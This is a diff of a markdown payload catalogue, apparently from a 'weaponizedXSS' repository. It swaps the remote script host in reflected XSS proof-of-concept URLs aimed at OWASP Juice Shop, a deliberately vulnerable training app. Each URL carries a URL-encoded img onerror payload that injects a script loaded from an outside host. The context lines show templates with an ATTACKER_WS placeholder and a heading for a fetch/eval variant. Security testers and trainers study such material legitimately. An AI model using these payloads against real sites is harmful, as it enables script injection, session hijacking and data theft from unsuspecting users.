@@ -38,7 +38,7 @@ with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/
 
 * *(live example - OWASP juice shop - reflected XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2F14.rs%2Ftest.js%27%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement('script')).src%3D'%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js';%22%3E
 
 ## `appendChild()` #2 - round brackets; quote; equal; space
 
@@ -48,7 +48,7 @@ var js=document.createElement('script');js.type='text/javascript';js.src='//ATTA
 
 * *(live example - OWASP juice shop - reflected XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2F14.rs%2Ftest.js%27%3Bdocument.body.appendChild(js)%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3Bdocument.body.appendChild(js)%3B%22%3E
 
 ## `fetch()` #1 - round brackets; right angle bracket; quote; equal; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`
 
